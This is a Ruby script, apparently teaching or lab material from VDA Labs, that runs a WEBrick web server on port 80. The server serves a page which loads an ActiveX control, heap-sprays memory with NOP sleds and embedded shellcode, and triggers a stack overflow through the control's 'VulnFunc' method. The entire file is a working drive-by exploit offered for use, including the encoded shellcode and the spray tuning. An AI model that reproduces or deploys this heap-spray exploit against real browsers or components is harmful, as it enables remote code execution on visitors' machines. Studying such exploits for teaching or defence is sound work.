#!/usr/bin/ruby
#
# Jared DeMott, VDA Labs, LLC

require 'webrick'

def gen_html

  html = <<EOF
<html>
      
<object classid='clsid:3D5A15F5-DAB1-4132-97C0-9FEBCDB473D6' id='target'></object>
<script language='javascript'>  

  blind_jmp = unescape("%u0606"); //stack clobber
  while( blind_jmp.length < 90000 ) //was 40000
	 blind_jmp += blind_jmp;
	
  
  //This is the "Traditional Heap Spray" technique used for this attack
  shellcode = unescape("%u4241%u4190%u3142%ub9c0%u07ea%u7e45%u08e8%u0000%u5000%u6e77%u6761%u2165%u5b00%u5350%u5053%ud1ff%ufab9%u81ca%u507c%ud1ff");
  
  nops = unescape("%u9090"); 
  while( nops.length < 9000000 ) //was 5000000 
      nops += nops;
      
  mem = new Array(); //"new" is like malloc
  for(i=0; i<15000; i++) //was 1250, retune to whatever is appropriate
      mem.push(nops+shellcode);
  //End HS code  
  

  target.VulnFunc(blind_jmp); //stack overflow occurs here

</script></html>
EOF

  return html
end

#
# WEBrick servlet that serves the HTML
#

class Exploit < WEBrick::HTTPServlet::AbstractServlet

  def do_GET(request, response)
    if request.path == "/rop.html"

      response['Content-Type'] = 'text/html'
      response.body = gen_html
      
    elsif request.path == "/exploit.html"

      response['Content-Type'] = 'text/html'
      response.body = gen_html
    
    else
      raise WEBrick::HTTPStatus::NotFound
    end
  end

end


#
# Main
#
# Disable reverse DNS lookups, they slow things down

BasicSocket.do_not_reverse_lookup = true

# Create a WEBrick server instance

server = WEBrick::HTTPServer.new(
  :Port            => 80
)

server.mount "/", Exploit

# Shutdown on Ctrl-C

trap("INT") { server.shutdown }

# Start the server

server.start
